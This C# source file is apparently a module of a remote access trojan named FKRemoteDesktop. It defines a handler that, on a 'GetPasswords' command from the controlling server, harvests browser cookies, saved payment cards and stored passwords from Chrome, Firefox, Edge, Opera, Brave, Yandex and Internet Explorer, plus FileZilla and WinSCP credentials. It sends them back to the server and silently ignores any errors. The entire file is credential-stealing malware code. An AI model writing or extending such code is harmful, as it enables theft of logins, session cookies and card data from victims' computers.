using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Stealer;
using FKRemoteDesktop.Stealer.Apps;
using FKRemoteDesktop.Stealer.Browsers;
using System.Collections.Generic;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class PasswordRecoveryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPasswords;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswords msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: GetPasswords");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPasswords message)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();
            var passReaders = new IAccountReader[]
            {
                new ChromiumCookieReader(),
                new ChromiumCardReader(),
                new MozillaCookieReader(),
                new MozillaPasswordReader(),
                new BravePasswordReader(),
                new ChromePasswordReader(),
                new OperaPasswordReader(),
                new OperaGXPasswordReader(),
                new EdgePasswordReader(),
                new YandexPasswordReader(),
                new FirefoxPasswordReader(),
                new InternetExplorerPasswordReader(),
                new FileZillaPasswordReader(),
                new WinScpPasswordReader()
            };

            foreach (var passReader in passReaders)
            {
                try
                {
                    recovered.AddRange(passReader.ReadAccounts());
                }
                catch { }
            }
            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
        }
    }
}